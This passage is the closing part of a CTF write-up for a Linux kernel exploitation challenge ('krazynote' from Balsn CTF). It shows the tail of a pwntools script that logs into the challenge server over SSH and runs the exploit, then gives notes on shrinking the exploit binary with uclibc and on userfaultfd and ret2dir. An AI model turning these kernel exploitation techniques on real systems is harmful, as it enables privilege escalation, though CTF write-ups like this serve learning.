	s = ssh(host="krazynote-3.balsnctf.com", port=54321, user="knote", password="knote", timeout=5)
	p = s.shell('/bin/sh')
	#p = process("./run.sh")
	exploit()

```

I spent about 5~6 hours moaning about this obstacle. Then, I remembered a pwnable challenge that I read a [write-up](https://thekidofarcrania.gitlab.io/2019/06/13/0ctf19-finals/) on. So I thought I should compile my binary with [uclibc](https://www.uclibc.org/). 

Compiling with uclibc is a bit complicated, but I just downloaded the uclibc build system, `chroot`ed into it, and compiled it. It worked brilliantly. The exploit shrinked to about 35 chunks, without stripping or any sort of optimization. 

## Overall
This was my first time doing a linux kernel exploit in a CTF. I learned a lot of things I only knew theoretically such as memory management, kernel memory protections, and userfaultfd.

At first I tried to use a technique known as `ret2dir` but I was afraid it wouldn't work, as I know that physmap pages are not RWX anymore. I should do some research about this as well.

Thanks for the Balsn CTF team for making a very decent kernel pwnable.
